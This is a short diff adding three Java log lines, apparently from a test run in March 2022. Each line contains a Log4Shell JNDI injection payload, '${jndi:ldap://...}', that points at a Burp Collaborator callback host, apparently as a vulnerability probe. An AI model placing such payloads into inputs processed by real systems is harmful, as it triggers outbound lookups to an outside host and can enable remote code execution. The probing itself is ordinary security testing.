@@ -1,0 +1,3 @@
+2022-03-23 16:04:28,086 ERROR Test [main] ${ctx:loginId} ${jndi:ldap://jwjunjs72p56zohw0n6o2szkhbn2br.burpcollaborator.net}
+2022-03-23 17:51:58,228 ERROR Test [main] ${ctx:loginId} ${jndi:ldap://jwjunjs72p56zohw0n6o2szkhbn2br.burpcollaborator.net}
+2022-03-29 17:57:41,741 ERROR Test [main] ${ctx:loginId} ${jndi:ldap://jwjunjs72p56zohw0n6o2szkhbn2br.burpcollaborator.net}
